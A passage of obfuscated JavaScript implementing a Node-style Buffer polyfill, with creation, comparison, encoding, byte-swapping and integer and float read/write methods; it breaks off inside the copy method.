gr=gb;if(typeof i5===gr(0x2a2))return X(i5,i6);if(ArrayBuffer[gr(0x2cb)](i5))return T(i5);if(i5==null)throw TypeError('The\x20first\x20argument\x20must\x20be\x20one\x20of\x20type\x20string,\x20Buffer,\x20ArrayBuffer,\x20Array,\x20'+gr(0x2f3)+typeof i5);if(i3(i5,ArrayBuffer)||i5&&i3(i5[gr(0x258)],ArrayBuffer))return j(i5,i6,i7);if(typeof i5===gr(0x275))throw new TypeError(gr(0x2a9));var i8=i5['valueOf']&&i5[gr(0x25a)]();if(i8!=null&&i8!==i5)return g[gr(0x2b7)](i8,i6,i7);var i9=b(i5);if(i9)return i9;if(typeof Symbol!==gr(0x2db)&&Symbol[gr(0x212)]!=null&&typeof i5[Symbol[gr(0x212)]]===gr(0x305))return g[gr(0x2b7)](i5[Symbol[gr(0x212)]](gr(0x2a2)),i6,i7);throw new TypeError(gr(0x2df)+'or\x20Array-like\x20Object.\x20Received\x20type\x20'+typeof i5);}g['from']=function(i5,i6,i7){return k(i5,i6,i7);},g[gb(0x1f3)][gb(0x34a)]=Uint8Array['prototype'],g['__proto__']=Uint8Array;function h(i5){var gc=gb;if(typeof i5!=='number')throw new TypeError(gc(0x381));else{if(i5<0x0)throw new RangeError(gc(0x1e0)+i5+gc(0x222));}}function t(i5,i6,i7){var gu=gb;h(i5);if(i5<=0x0)return C(i5);if(i6!==undefined)return typeof i7===gu(0x2a2)?C(i5)['fill'](i6,i7):C(i5)[gu(0x339)](i6);return C(i5);}g[gb(0x2ee)]=function(i5,i6,i7){return t(i5,i6,i7);};function p(i5){return h(i5),C(i5<0x0?0x0:Z(i5)|0x0);}g['allocUnsafe']=function(i5){return p(i5);},g['allocUnsafeSlow']=function(i5){return p(i5);};function X(i5,i6){var gA=gb;(typeof i6!==gA(0x2a2)||i6==='')&&(i6=gA(0x2ec));if(!g['isEncoding'](i6))throw new TypeError(gA(0x1ff)+i6);var i7=U(i5,i6)|0x0,i8=C(i7),i9=i8[gA(0x1e6)](i5,i6);return i9!==i7&&(i8=i8[gA(0x26f)](0x0,i9)),i8;}function T(i5){var gO=gb,i6=i5[gO(0x2b0)]<0x0?0x0:Z(i5['length'])|0x0,i7=C(i6);for(var i8=0x0;i8<i6;i8+=0x1){i7[i8]=i5[i8]&0xff;}return i7;}function j(i5,i6,i7){var gQ=gb;if(i6<0x0||i5[gQ(0x24a)]<i6)throw new RangeError(gQ(0x287));if(i5[gQ(0x24a)]<i6+(i7||0x0))throw new RangeError(gQ(0x323));var i8;if(i6===undefined&&i7===undefined)i8=new Uint8Array(i5);else i7===undefined?i8=new Uint8Array(i5,i6):i8=new Uint8Array(i5,i6,i7);return i8['__proto__']=g['prototype'],i8;}function b(i5){var gY=gb;if(g[gY(0x1f8)](i5)){var i6=Z(i5[gY(0x2b0)])|0x0,i7=C(i6);if(i7['length']===0x0)return i7;return i5[gY(0x270)](i7,0x0,0x0,i6),i7;}if(i5[gY(0x2b0)]!==undefined){if(typeof i5[gY(0x2b0)]!==gY(0x275)||i4(i5[gY(0x2b0)]))return C(0x0);return T(i5);}if(i5[gY(0x25c)]===gY(0x285)&&Array[gY(0x1d7)](i5[gY(0x1dd)]))return T(i5['data']);}function Z(i5){var gP=gb;if(i5>=M)throw new RangeError(gP(0x36e)+gP(0x399)+M[gP(0x1ec)](0x10)+gP(0x24e));return i5|0x0;}function E(i5){var gw=gb;return+i5!=i5&&(i5=0x0),g[gw(0x2ee)](+i5);}g[gb(0x1f8)]=function i5(i6){var gG=gb;return i6!=null&&i6[gG(0x39f)]===!![]&&i6!==g[gG(0x1f3)];},g['compare']=function i6(i7,i8){var gW=gb;if(i3(i7,Uint8Array))i7=g[gW(0x2b7)](i7,i7['offset'],i7[gW(0x24a)]);if(i3(i8,Uint8Array))i8=g['from'](i8,i8[gW(0x377)],i8['byteLength']);if(!g[gW(0x1f8)](i7)||!g['isBuffer'](i8))throw new TypeError(gW(0x1d6));if(i7===i8)return 0x0;var i9=i7[gW(0x2b0)],ii=i8[gW(0x2b0)];for(var is=0x0,iF=Math[gW(0x1e2)](i9,ii);is<iF;++is){if(i7[is]!==i8[is]){i9=i7[is],ii=i8[is];break;}}if(i9<ii)return-0x1;if(ii<i9)return 0x1;return 0x0;},g[gb(0x29e)]=function i7(i8){var gl=gb;switch(String(i8)[gl(0x241)]()){case gl(0x2fe):case gl(0x2ec):case'utf-8':case gl(0x29c):case gl(0x21f):case'binary':case gl(0x2e6):case gl(0x3a4):case gl(0x20a):case gl(0x235):case gl(0x277):return!![];default:return![];}},g[gb(0x397)]=function i8(i9,ii){var ge=gb;if(!Array['isArray'](i9))throw new TypeError('\x22list\x22\x20argument\x20must\x20be\x20an\x20Array\x20of\x20Buffers');if(i9[ge(0x2b0)]===0x0)return g[ge(0x2ee)](0x0);var is;if(ii===undefined){ii=0x0;for(is=0x0;is<i9[ge(0x2b0)];++is){ii+=i9[is][ge(0x2b0)];}}var iF=g[ge(0x314)](ii),ig=0x0;for(is=0x0;is<i9[ge(0x2b0)];++is){var iv=i9[is];i3(iv,Uint8Array)&&(iv=g['from'](iv));if(!g['isBuffer'](iv))throw new TypeError('\x22list\x22\x20argument\x20must\x20be\x20an\x20Array\x20of\x20Buffers');iv[ge(0x270)](iF,ig),ig+=iv[ge(0x2b0)];}return iF;};function U(i9,ii){var gm=gb;if(g[gm(0x1f8)](i9))return i9[gm(0x2b0)];if(ArrayBuffer[gm(0x2cb)](i9)||i3(i9,ArrayBuffer))return i9[gm(0x24a)];if(typeof i9!==gm(0x2a2))throw new TypeError(gm(0x28f)+'Received\x20type\x20'+typeof i9);var is=i9['length'],iF=arguments['length']>0x2&&arguments[0x2]===!![];if(!iF&&is===0x0)return 0x0;var ig=![];for(;;){switch(ii){case'ascii':case gm(0x21f):case'binary':return is;case gm(0x2ec):case'utf-8':return D(i9)[gm(0x2b0)];case gm(0x3a4):case'ucs-2':case gm(0x235):case gm(0x277):return is*0x2;case gm(0x2fe):return is>>>0x1;case gm(0x2e6):return i1(i9)['length'];default:if(ig)return iF?-0x1:D(i9)['length'];ii=(''+ii)[gm(0x241)](),ig=!![];}}}g[gb(0x24a)]=U;function V(i9,ii,is){var go=gb,iF=![];(ii===undefined||ii<0x0)&&(ii=0x0);if(ii>this[go(0x2b0)])return'';(is===undefined||is>this['length'])&&(is=this[go(0x2b0)]);if(is<=0x0)return'';is>>>=0x0,ii>>>=0x0;if(is<=ii)return'';if(!i9)i9=go(0x2ec);while(!![]){switch(i9){case'hex':return o(this,ii,is);case go(0x2ec):case go(0x232):return G(this,ii,is);case go(0x29c):return e(this,ii,is);case go(0x21f):case go(0x2e1):return m(this,ii,is);case'base64':return w(this,ii,is);case go(0x3a4):case go(0x20a):case go(0x235):case'utf-16le':return L(this,ii,is);default:if(iF)throw new TypeError(go(0x1ff)+i9);i9=(i9+'')['toLowerCase'](),iF=!![];}}}g[gb(0x1f3)]['_isBuffer']=!![];function d(i9,ii,is){var iF=i9[ii];i9[ii]=i9[is],i9[is]=iF;}g[gb(0x1f3)][gb(0x207)]=function i9(){var gL=gb,ii=this[gL(0x2b0)];if(ii%0x2!==0x0)throw new RangeError('Buffer\x20size\x20must\x20be\x20a\x20multiple\x20of\x2016-bits');for(var is=0x0;is<ii;is+=0x2){d(this,is,is+0x1);}return this;},g['prototype']['swap32']=function ii(){var gJ=gb,is=this[gJ(0x2b0)];if(is%0x4!==0x0)throw new RangeError('Buffer\x20size\x20must\x20be\x20a\x20multiple\x20of\x2032-bits');for(var iF=0x0;iF<is;iF+=0x4){d(this,iF,iF+0x3),d(this,iF+0x1,iF+0x2);}return this;},g[gb(0x1f3)][gb(0x292)]=function is(){var gH=gb,iF=this[gH(0x2b0)];if(iF%0x8!==0x0)throw new RangeError(gH(0x301));for(var ig=0x0;ig<iF;ig+=0x8){d(this,ig,ig+0x7),d(this,ig+0x1,ig+0x6),d(this,ig+0x2,ig+0x5),d(this,ig+0x3,ig+0x4);}return this;},g[gb(0x1f3)][gb(0x1ec)]=function iF(){var gN=gb,ig=this[gN(0x2b0)];if(ig===0x0)return'';if(arguments[gN(0x2b0)]===0x0)return G(this,0x0,ig);return V[gN(0x22b)](this,arguments);},g[gb(0x1f3)][gb(0x2e5)]=g[gb(0x1f3)][gb(0x1ec)],g[gb(0x1f3)][gb(0x2d0)]=function ig(iv){var gn=gb;if(!g[gn(0x1f8)](iv))throw new TypeError(gn(0x20d));if(this===iv)return!![];return g[gn(0x33d)](this,iv)===0x0;},g['prototype'][gb(0x2d8)]=function iv(){var gI=gb,iz='',iS=F[gI(0x2e9)];iz=this[gI(0x1ec)](gI(0x2fe),0x0,iS)['replace'](/(.{2})/g,gI(0x263))['trim']();if(this['length']>iS)iz+='\x20...\x20';return gI(0x211)+iz+'>';},g[gb(0x1f3)][gb(0x33d)]=function iz(iS,iB,iM,iK,iC){var gf=gb;i3(iS,Uint8Array)&&(iS=g[gf(0x2b7)](iS,iS[gf(0x377)],iS['byteLength']));if(!g[gf(0x1f8)](iS))throw new TypeError(gf(0x309)+gf(0x1e7)+typeof iS);iB===undefined&&(iB=0x0);iM===undefined&&(iM=iS?iS['length']:0x0);iK===undefined&&(iK=0x0);iC===undefined&&(iC=this[gf(0x2b0)]);if(iB<0x0||iM>iS[gf(0x2b0)]||iK<0x0||iC>this[gf(0x2b0)])throw new RangeError('out\x20of\x20range\x20index');if(iK>=iC&&iB>=iM)return 0x0;if(iK>=iC)return-0x1;if(iB>=iM)return 0x1;iB>>>=0x0,iM>>>=0x0,iK>>>=0x0,iC>>>=0x0;if(this===iS)return 0x0;var ik=iC-iK,ih=iM-iB,it=Math[gf(0x1e2)](ik,ih),ip=this[gf(0x26f)](iK,iC),iy=iS[gf(0x26f)](iB,iM);for(var iX=0x0;iX<it;++iX){if(ip[iX]!==iy[iX]){ik=ip[iX],ih=iy[iX];break;}}if(ik<ih)return-0x1;if(ih<ik)return 0x1;return 0x0;};function r(iS,iB,iM,iK,iC){var ga=gb;if(iS['length']===0x0)return-0x1;if(typeof iM===ga(0x2a2))iK=iM,iM=0x0;else{if(iM>0x7fffffff)iM=0x7fffffff;else iM<-0x80000000&&(iM=-0x80000000);}iM=+iM;i4(iM)&&(iM=iC?0x0:iS[ga(0x2b0)]-0x1);if(iM<0x0)iM=iS['length']+iM;if(iM>=iS['length']){if(iC)return-0x1;else iM=iS[ga(0x2b0)]-0x1;}else{if(iM<0x0){if(iC)iM=0x0;else return-0x1;}}typeof iB===ga(0x2a2)&&(iB=g[ga(0x2b7)](iB,iK));if(g[ga(0x1f8)](iB)){if(iB['length']===0x0)return-0x1;return c(iS,iB,iM,iK,iC);}else{if(typeof iB===ga(0x275)){iB=iB&0xff;if(typeof Uint8Array[ga(0x1f3)]['indexOf']===ga(0x305))return iC?Uint8Array['prototype']['indexOf'][ga(0x300)](iS,iB,iM):Uint8Array[ga(0x1f3)][ga(0x2d4)][ga(0x300)](iS,iB,iM);return c(iS,[iB],iM,iK,iC);}}throw new TypeError(ga(0x290));}function c(iS,iB,iM,iK,iC){var gx=gb,ik=0x1,ih=iS[gx(0x2b0)],it=iB['length'];if(iK!==undefined){iK=String(iK)[gx(0x241)]();if(iK===gx(0x3a4)||iK===gx(0x20a)||iK===gx(0x235)||iK===gx(0x277)){if(iS['length']<0x2||iB[gx(0x2b0)]<0x2)return-0x1;ik=0x2,ih/=0x2,it/=0x2,iM/=0x2;}}function ip(ib,iZ){var gR=gx;return ik===0x1?ib[iZ]:ib[gR(0x33a)](iZ*ik);}var iy;if(iC){var iX=-0x1;for(iy=iM;iy<ih;iy++){if(ip(iS,iy)===ip(iB,iX===-0x1?0x0:iy-iX)){if(iX===-0x1)iX=iy;if(iy-iX+0x1===it)return iX*ik;}else{if(iX!==-0x1)iy-=iy-iX;iX=-0x1;}}}else{if(iM+it>ih)iM=ih-it;for(iy=iM;iy>=0x0;iy--){var iT=!![];for(var ij=0x0;ij<it;ij++){if(ip(iS,iy+ij)!==ip(iB,ij)){iT=![];break;}}if(iT)return iy;}}return-0x1;}g[gb(0x1f3)][gb(0x3a7)]=function iS(iB,iM,iK){var gD=gb;return this[gD(0x302)](iB,iM,iK)!==-0x1;},g[gb(0x1f3)][gb(0x302)]=function iB(iM,iK,iC){return r(this,iM,iK,iC,!![]);},g[gb(0x1f3)][gb(0x2d4)]=function iM(iK,iC,ik){return r(this,iK,iC,ik,![]);};function u(iK,iC,ik,ih){var gq=gb;ik=Number(ik)||0x0;var it=iK['length']-ik;!ih?ih=it:(ih=Number(ih),ih>it&&(ih=it));var ip=iC[gq(0x2b0)];ih>ip/0x2&&(ih=ip/0x2);for(var iy=0x0;iy<ih;++iy){var iX=parseInt(iC['substr'](iy*0x2,0x2),0x10);if(i4(iX))return iy;iK[ik+iy]=iX;}return iy;}function A(iK,iC,ik,ih){var v0=gb;return i2(D(iC,iK[v0(0x2b0)]-ik),iK,ik,ih);}function O(iK,iC,ik,ih){return i2(q(iC),iK,ik,ih);}function Q(iK,iC,ik,ih){return O(iK,iC,ik,ih);}function Y(iK,iC,ik,ih){return i2(i1(iC),iK,ik,ih);}function P(iK,iC,ik,ih){var v1=gb;return i2(i0(iC,iK[v1(0x2b0)]-ik),iK,ik,ih);}g[gb(0x1f3)][gb(0x1e6)]=function iK(iC,ik,ih,it){var v2=gb;if(ik===undefined)it=v2(0x2ec),ih=this[v2(0x2b0)],ik=0x0;else{if(ih===undefined&&typeof ik==='string')it=ik,ih=this['length'],ik=0x0;else{if(isFinite(ik)){ik=ik>>>0x0;if(isFinite(ih)){ih=ih>>>0x0;if(it===undefined)it=v2(0x2ec);}else it=ih,ih=undefined;}else throw new Error(v2(0x281));}}var ip=this[v2(0x2b0)]-ik;if(ih===undefined||ih>ip)ih=ip;if(iC[v2(0x2b0)]>0x0&&(ih<0x0||ik<0x0)||ik>this[v2(0x2b0)])throw new RangeError('Attempt\x20to\x20write\x20outside\x20buffer\x20bounds');if(!it)it=v2(0x2ec);var iy=![];for(;;){switch(it){case v2(0x2fe):return u(this,iC,ik,ih);case'utf8':case v2(0x232):return A(this,iC,ik,ih);case v2(0x29c):return O(this,iC,ik,ih);case v2(0x21f):case v2(0x2e1):return Q(this,iC,ik,ih);case v2(0x2e6):return Y(this,iC,ik,ih);case v2(0x3a4):case'ucs-2':case v2(0x235):case v2(0x277):return P(this,iC,ik,ih);default:if(iy)throw new TypeError(v2(0x1ff)+it);it=(''+it)[v2(0x241)](),iy=!![];}}},g[gb(0x1f3)]['toJSON']=function iC(){var v3=gb;return{'type':v3(0x285),'data':Array[v3(0x1f3)][v3(0x26f)][v3(0x300)](this['_arr']||this,0x0)};};function w(ik,ih,it){var v4=gb;return ih===0x0&&it===ik['length']?S[v4(0x36f)](ik):S[v4(0x36f)](ik[v4(0x26f)](ih,it));}function G(ik,ih,it){var v5=gb;it=Math[v5(0x1e2)](ik['length'],it);var ip=[],iy=ih;while(iy<it){var iX=ik[iy],iT=null,ij=iX>0xef?0x4:iX>0xdf?0x3:iX>0xbf?0x2:0x1;if(iy+ij<=it){var ib,iZ,iE,iU;switch(ij){case 0x1:iX<0x80&&(iT=iX);break;case 0x2:ib=ik[iy+0x1];(ib&0xc0)===0x80&&(iU=(iX&0x1f)<<0x6|ib&0x3f,iU>0x7f&&(iT=iU));break;case 0x3:ib=ik[iy+0x1],iZ=ik[iy+0x2];(ib&0xc0)===0x80&&(iZ&0xc0)===0x80&&(iU=(iX&0xf)<<0xc|(ib&0x3f)<<0x6|iZ&0x3f,iU>0x7ff&&(iU<0xd800||iU>0xdfff)&&(iT=iU));break;case 0x4:ib=ik[iy+0x1],iZ=ik[iy+0x2],iE=ik[iy+0x3];(ib&0xc0)===0x80&&(iZ&0xc0)===0x80&&(iE&0xc0)===0x80&&(iU=(iX&0xf)<<0x12|(ib&0x3f)<<0xc|(iZ&0x3f)<<0x6|iE&0x3f,iU>0xffff&&iU<0x110000&&(iT=iU));}}if(iT===null)iT=0xfffd,ij=0x1;else iT>0xffff&&(iT-=0x10000,ip['push'](iT>>>0xa&0x3ff|0xd800),iT=0xdc00|iT&0x3ff);ip['push'](iT),iy+=ij;}return l(ip);}var W=0x1000;function l(ik){var v6=gb,ih=ik[v6(0x2b0)];if(ih<=W)return String['fromCharCode'][v6(0x22b)](String,ik);var it='',ip=0x0;while(ip<ih){it+=String[v6(0x243)][v6(0x22b)](String,ik[v6(0x26f)](ip,ip+=W));}return it;}function e(ik,ih,it){var v7=gb,ip='';it=Math[v7(0x1e2)](ik[v7(0x2b0)],it);for(var iy=ih;iy<it;++iy){ip+=String['fromCharCode'](ik[iy]&0x7f);}return ip;}function m(ik,ih,it){var v8=gb,ip='';it=Math[v8(0x1e2)](ik[v8(0x2b0)],it);for(var iy=ih;iy<it;++iy){ip+=String[v8(0x243)](ik[iy]);}return ip;}function o(ik,ih,it){var ip=ik['length'];if(!ih||ih<0x0)ih=0x0;if(!it||it<0x0||it>ip)it=ip;var iy='';for(var iX=ih;iX<it;++iX){iy+=R(ik[iX]);}return iy;}function L(ik,ih,it){var v9=gb,ip=ik[v9(0x26f)](ih,it),iy='';for(var iX=0x0;iX<ip[v9(0x2b0)];iX+=0x2){iy+=String[v9(0x243)](ip[iX]+ip[iX+0x1]*0x100);}return iy;}g['prototype'][gb(0x26f)]=function ik(ih,it){var vi=gb,ip=this['length'];ih=~~ih,it=it===undefined?ip:~~it;if(ih<0x0){ih+=ip;if(ih<0x0)ih=0x0;}else ih>ip&&(ih=ip);if(it<0x0){it+=ip;if(it<0x0)it=0x0;}else it>ip&&(it=ip);if(it<ih)it=ih;var iy=this[vi(0x1f1)](ih,it);return iy['__proto__']=g['prototype'],iy;};function J(ih,it,ip){var vs=gb;if(ih%0x1!==0x0||ih<0x0)throw new RangeError(vs(0x374));if(ih+it>ip)throw new RangeError('Trying\x20to\x20access\x20beyond\x20buffer\x20length');}g[gb(0x1f3)][gb(0x360)]=function ih(it,ip,iy){var vF=gb;it=it>>>0x0,ip=ip>>>0x0;if(!iy)J(it,ip,this[vF(0x2b0)]);var iX=this[it],iT=0x1,ij=0x0;while(++ij<ip&&(iT*=0x100)){iX+=this[it+ij]*iT;}return iX;},g[gb(0x1f3)][gb(0x2fc)]=function it(ip,iy,iX){var vg=gb;ip=ip>>>0x0,iy=iy>>>0x0;!iX&&J(ip,iy,this[vg(0x2b0)]);var iT=this[ip+--iy],ij=0x1;while(iy>0x0&&(ij*=0x100)){iT+=this[ip+--iy]*ij;}return iT;},g[gb(0x1f3)][gb(0x1d8)]=function ip(iy,iX){var vv=gb;iy=iy>>>0x0;if(!iX)J(iy,0x1,this[vv(0x2b0)]);return this[iy];},g['prototype'][gb(0x329)]=function iy(iX,iT){var vz=gb;iX=iX>>>0x0;if(!iT)J(iX,0x2,this[vz(0x2b0)]);return this[iX]|this[iX+0x1]<<0x8;},g[gb(0x1f3)]['readUInt16BE']=function iX(iT,ij){var vS=gb;iT=iT>>>0x0;if(!ij)J(iT,0x2,this[vS(0x2b0)]);return this[iT]<<0x8|this[iT+0x1];},g[gb(0x1f3)]['readUInt32LE']=function iT(ij,ib){var vB=gb;ij=ij>>>0x0;if(!ib)J(ij,0x4,this[vB(0x2b0)]);return(this[ij]|this[ij+0x1]<<0x8|this[ij+0x2]<<0x10)+this[ij+0x3]*0x1000000;},g[gb(0x1f3)][gb(0x237)]=function ij(ib,iZ){var vM=gb;ib=ib>>>0x0;if(!iZ)J(ib,0x4,this[vM(0x2b0)]);return this[ib]*0x1000000+(this[ib+0x1]<<0x10|this[ib+0x2]<<0x8|this[ib+0x3]);},g[gb(0x1f3)]['readIntLE']=function ib(iZ,iE,iU){var vK=gb;iZ=iZ>>>0x0,iE=iE>>>0x0;if(!iU)J(iZ,iE,this[vK(0x2b0)]);var iV=this[iZ],id=0x1,ir=0x0;while(++ir<iE&&(id*=0x100)){iV+=this[iZ+ir]*id;}id*=0x80;if(iV>=id)iV-=Math['pow'](0x2,0x8*iE);return iV;},g['prototype'][gb(0x28a)]=function iZ(iE,iU,iV){var vC=gb;iE=iE>>>0x0,iU=iU>>>0x0;if(!iV)J(iE,iU,this['length']);var id=iU,ir=0x1,ic=this[iE+--id];while(id>0x0&&(ir*=0x100)){ic+=this[iE+--id]*ir;}ir*=0x80;if(ic>=ir)ic-=Math[vC(0x294)](0x2,0x8*iU);return ic;},g['prototype'][gb(0x27e)]=function iE(iU,iV){iU=iU>>>0x0;if(!iV)J(iU,0x1,this['length']);if(!(this[iU]&0x80))return this[iU];return(0xff-this[iU]+0x1)*-0x1;},g[gb(0x1f3)]['readInt16LE']=function iU(iV,id){iV=iV>>>0x0;if(!id)J(iV,0x2,this['length']);var ir=this[iV]|this[iV+0x1]<<0x8;return ir&0x8000?ir|0xffff0000:ir;},g['prototype'][gb(0x3a0)]=function iV(id,ir){var vk=gb;id=id>>>0x0;if(!ir)J(id,0x2,this[vk(0x2b0)]);var ic=this[id+0x1]|this[id]<<0x8;return ic&0x8000?ic|0xffff0000:ic;},g['prototype'][gb(0x221)]=function id(ir,ic){ir=ir>>>0x0;if(!ic)J(ir,0x4,this['length']);return this[ir]|this[ir+0x1]<<0x8|this[ir+0x2]<<0x10|this[ir+0x3]<<0x18;},g['prototype'][gb(0x3ad)]=function ir(ic,iu){var vh=gb;ic=ic>>>0x0;if(!iu)J(ic,0x4,this[vh(0x2b0)]);return this[ic]<<0x18|this[ic+0x1]<<0x10|this[ic+0x2]<<0x8|this[ic+0x3];},g[gb(0x1f3)][gb(0x23a)]=function ic(iu,iA){var vt=gb;iu=iu>>>0x0;if(!iA)J(iu,0x4,this['length']);return B[vt(0x296)](this,iu,!![],0x17,0x4);},g[gb(0x1f3)][gb(0x26c)]=function iu(iA,iO){var vp=gb;iA=iA>>>0x0;if(!iO)J(iA,0x4,this['length']);return B[vp(0x296)](this,iA,![],0x17,0x4);},g[gb(0x1f3)]['readDoubleLE']=function iA(iO,iQ){var vy=gb;iO=iO>>>0x0;if(!iQ)J(iO,0x8,this[vy(0x2b0)]);return B['read'](this,iO,!![],0x34,0x8);},g[gb(0x1f3)][gb(0x304)]=function iO(iQ,iY){var vX=gb;iQ=iQ>>>0x0;if(!iY)J(iQ,0x8,this[vX(0x2b0)]);return B[vX(0x296)](this,iQ,![],0x34,0x8);};function H(iQ,iY,iP,iw,iG,iW){var vT=gb;if(!g[vT(0x1f8)](iQ))throw new TypeError(vT(0x379));if(iY>iG||iY<iW)throw new RangeError('\x22value\x22\x20argument\x20is\x20out\x20of\x20bounds');if(iP+iw>iQ[vT(0x2b0)])throw new RangeError(vT(0x333));}g[gb(0x1f3)][gb(0x29b)]=function iQ(iY,iP,iw,iG){var vj=gb;iY=+iY,iP=iP>>>0x0,iw=iw>>>0x0;if(!iG){var iW=Math[vj(0x294)](0x2,0x8*iw)-0x1;H(this,iY,iP,iw,iW,0x0);}var il=0x1,ie=0x0;this[iP]=iY&0xff;while(++ie<iw&&(il*=0x100)){this[iP+ie]=iY/ il&0xff;}return iP+iw;},g['prototype'][gb(0x361)]=function iY(iP,iw,iG,iW){var vb=gb;iP=+iP,iw=iw>>>0x0,iG=iG>>>0x0;if(!iW){var il=Math[vb(0x294)](0x2,0x8*iG)-0x1;H(this,iP,iw,iG,il,0x0);}var ie=iG-0x1,im=0x1;this[iw+ie]=iP&0xff;while(--ie>=0x0&&(im*=0x100)){this[iw+ie]=iP/ im&0xff;}return iw+iG;},g[gb(0x1f3)][gb(0x1e1)]=function iP(iw,iG,iW){iw=+iw,iG=iG>>>0x0;if(!iW)H(this,iw,iG,0x1,0xff,0x0);return this[iG]=iw&0xff,iG+0x1;},g[gb(0x1f3)]['writeUInt16LE']=function iw(iG,iW,il){iG=+iG,iW=iW>>>0x0;if(!il)H(this,iG,iW,0x2,0xffff,0x0);return this[iW]=iG&0xff,this[iW+0x1]=iG>>>0x8,iW+0x2;},g[gb(0x1f3)]['writeUInt16BE']=function iG(iW,il,ie){iW=+iW,il=il>>>0x0;if(!ie)H(this,iW,il,0x2,0xffff,0x0);return this[il]=iW>>>0x8,this[il+0x1]=iW&0xff,il+0x2;},g[gb(0x1f3)][gb(0x2b1)]=function iW(il,ie,im){il=+il,ie=ie>>>0x0;if(!im)H(this,il,ie,0x4,0xffffffff,0x0);return this[ie+0x3]=il>>>0x18,this[ie+0x2]=il>>>0x10,this[ie+0x1]=il>>>0x8,this[ie]=il&0xff,ie+0x4;},g[gb(0x1f3)][gb(0x2e0)]=function il(ie,im,io){ie=+ie,im=im>>>0x0;if(!io)H(this,ie,im,0x4,0xffffffff,0x0);return this[im]=ie>>>0x18,this[im+0x1]=ie>>>0x10,this[im+0x2]=ie>>>0x8,this[im+0x3]=ie&0xff,im+0x4;},g[gb(0x1f3)][gb(0x336)]=function ie(im,io,iL,iJ){var vZ=gb;im=+im,io=io>>>0x0;if(!iJ){var iH=Math[vZ(0x294)](0x2,0x8*iL-0x1);H(this,im,io,iL,iH-0x1,-iH);}var iN=0x0,iI=0x1,ia=0x0;this[io]=im&0xff;while(++iN<iL&&(iI*=0x100)){im<0x0&&ia===0x0&&this[io+iN-0x1]!==0x0&&(ia=0x1),this[io+iN]=(im/ iI>>0x0)-ia&0xff;}return io+iL;},g['prototype'][gb(0x240)]=function im(io,iL,iJ,iH){var vE=gb;io=+io,iL=iL>>>0x0;if(!iH){var iN=Math[vE(0x294)](0x2,0x8*iJ-0x1);H(this,io,iL,iJ,iN-0x1,-iN);}var iI=iJ-0x1,ia=0x1,ix=0x0;this[iL+iI]=io&0xff;while(--iI>=0x0&&(ia*=0x100)){io<0x0&&ix===0x0&&this[iL+iI+0x1]!==0x0&&(ix=0x1),this[iL+iI]=(io/ ia>>0x0)-ix&0xff;}return iL+iJ;},g['prototype']['writeInt8']=function io(iL,iJ,iH){iL=+iL,iJ=iJ>>>0x0;if(!iH)H(this,iL,iJ,0x1,0x7f,-0x80);if(iL<0x0)iL=0xff+iL+0x1;return this[iJ]=iL&0xff,iJ+0x1;},g['prototype'][gb(0x204)]=function iL(iJ,iH,iN){iJ=+iJ,iH=iH>>>0x0;if(!iN)H(this,iJ,iH,0x2,0x7fff,-0x8000);return this[iH]=iJ&0xff,this[iH+0x1]=iJ>>>0x8,iH+0x2;},g[gb(0x1f3)]['writeInt16BE']=function iJ(iH,iN,iI){iH=+iH,iN=iN>>>0x0;if(!iI)H(this,iH,iN,0x2,0x7fff,-0x8000);return this[iN]=iH>>>0x8,this[iN+0x1]=iH&0xff,iN+0x2;},g[gb(0x1f3)][gb(0x376)]=function iH(iN,iI,ia){iN=+iN,iI=iI>>>0x0;if(!ia)H(this,iN,iI,0x4,0x7fffffff,-0x80000000);return this[iI]=iN&0xff,this[iI+0x1]=iN>>>0x8,this[iI+0x2]=iN>>>0x10,this[iI+0x3]=iN>>>0x18,iI+0x4;},g['prototype']['writeInt32BE']=function iN(iI,ia,ix){iI=+iI,ia=ia>>>0x0;if(!ix)H(this,iI,ia,0x4,0x7fffffff,-0x80000000);if(iI<0x0)iI=0xffffffff+iI+0x1;return this[ia]=iI>>>0x18,this[ia+0x1]=iI>>>0x10,this[ia+0x2]=iI>>>0x8,this[ia+0x3]=iI&0xff,ia+0x4;};function N(iI,ia,ix,iR,iD,iq){var vU=gb;if(ix+iR>iI[vU(0x2b0)])throw new RangeError(vU(0x333));if(ix<0x0)throw new RangeError(vU(0x333));}function n(iI,ia,ix,iR,iD){var vV=gb;return ia=+ia,ix=ix>>>0x0,!iD&&N(iI,ia,ix,0x4,0xffffff00000000000000000000000000,-0xffffff00000000000000000000000000),B[vV(0x1e6)](iI,ia,ix,iR,0x17,0x4),ix+0x4;}g[gb(0x1f3)][gb(0x33c)]=function iI(ia,ix,iR){return n(this,ia,ix,!![],iR);},g[gb(0x1f3)][gb(0x27a)]=function ia(ix,iR,iD){return n(this,ix,iR,![],iD);};function I(ix,iR,iD,iq,s0){var vd=gb;return iR=+iR,iD=iD>>>0x0,!s0&&N(ix,iR,iD,0x8,0xfffffffffffff800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,-0xfffffffffffff800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000),B[vd(0x1e6)](ix,iR,iD,iq,0x34,0x8),iD+0x8;}g['prototype']['writeDoubleLE']=function ix(iR,iD,iq){return I(this,iR,iD,!![],iq);},g[gb(0x1f3)][gb(0x288)]=function iR(iD,iq,s0){return I(this,iD,iq,![],s0);},g[gb(0x1f3)][gb(0x270)]=function iD(iq,s0,s1,s2){var vr=gb;if(!g[vr(0x1f8)](iq))throw new TypeError('argument\x20should\x20be\x20a\x20Buffer');if(!s1)s1=0x0;if(!s2&&s2!==0x0)s2=this[vr(0x2b0)];if(s0>=iq[vr(0x2b0)])s0=iq[vr(0x2b0)];if(!s0)s0=0x0;if(s2>0x0&&s2<s1)s2=s1;if(s2===s1)return 0x0;if(iq[vr(0x2b0)]===0x0||this[vr(0x2b0)]===0x0)return 0x0;if(s0<0x0)throw new RangeError(vr(0x1ed));if(s1<0x0||s1>=this[vr(0x2b0)])throw new RangeError(vr(0x333));if(s2<0x0)throw new RangeError(vr(0x23c));if(s2>this[vr(0x2b0)])s2=this['length'];iq[vr(0x2b0)]-s0<s2-s1&&(s2=iq[vr(0x2b0)]-s0+s1);var s3=s2-s1;if(this===iq&&typeof Uint8Array[vr(0x1f3)]['copyWithin']===vr(0x305))this['copyWithin'](s0,s1,s2);else{if(this===iq&&s1<s0&&s0<s2)for(var s4=s3-0x1;s4>=0x0;--s4){iq[s4+s0]=this[s4+s1];}else 